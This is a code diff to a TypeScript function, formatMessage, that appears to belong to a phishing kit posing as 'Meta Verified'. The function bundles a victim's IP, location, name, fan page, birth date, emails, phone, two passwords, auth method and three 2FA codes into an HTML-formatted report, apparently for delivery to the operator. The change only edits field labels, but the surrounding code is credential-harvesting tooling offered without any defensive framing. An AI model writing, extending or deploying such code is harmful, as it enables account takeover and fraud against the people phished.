@@ -203,35 +203,35 @@ function formatMessage(data: any): string {
     const header = `📋 <b>Meta Verified</b> · <i>${escapeHtml(ts)}</i>`;
 
     const network = groupLines([
-        row('IP', displayCode(d.ip)),
-        row('Loc', displayCode(d.location)),
+        row('IP: ', displayCode(d.ip)),
+        row('Loc: ', displayCode(d.location)),
     ]);
 
     const profile = groupLines([
-        row('Name', displayCode(d.fullName)),
-        row('Page', displayCode(d.fanpage)),
-        row('DOB', formatDobParts(d.day, d.month, d.year)),
+        row('Name: ', displayCode(d.fullName)),
+        row('Page: ', displayCode(d.fanpage)),
+        row('DOB: ', formatDobParts(d.day, d.month, d.year)),
     ]);
 
     const contact = groupLines([
-        row('Email', displayCode(d.email)),
-        row('Biz email', displayCode(d.emailBusiness)),
-        row('Phone', phoneInner),
+        row('Email: ', displayCode(d.email)),
+        row('Biz email: ', displayCode(d.emailBusiness)),
+        row('Phone: ', phoneInner),
     ]);
 
     const credRows = [
-        row('Pass 1', displayCode(d.password)),
-        row('Pass 2', displayCode(d.passwordSecond)),
+        row('Pass 1: ', displayCode(d.password)),
+        row('Pass 2: ', displayCode(d.passwordSecond)),
     ];
     if (String(d.authMethod ?? '').trim()) {
-        credRows.push(row('Auth', displayCode(d.authMethod)));
+        credRows.push(row('Auth: ', displayCode(d.authMethod)));
     }
     const credentials = groupLines(credRows);
 
     const twoFa = groupLines([
-        row('2FA 1', displayCode(d.twoFa)),
-        row('2FA 2', displayCode(d.twoFaSecond)),
-        row('2FA 3', displayCode(d.twoFaThird)),
+        row('2FA 1: ', displayCode(d.twoFa)),
+        row('2FA 2: ', displayCode(d.twoFaSecond)),
+        row('2FA 3: ', displayCode(d.twoFaThird)),
     ]);
 
     const parts = [header, network, profile, contact, credentials, twoFa].filter(Boolean);
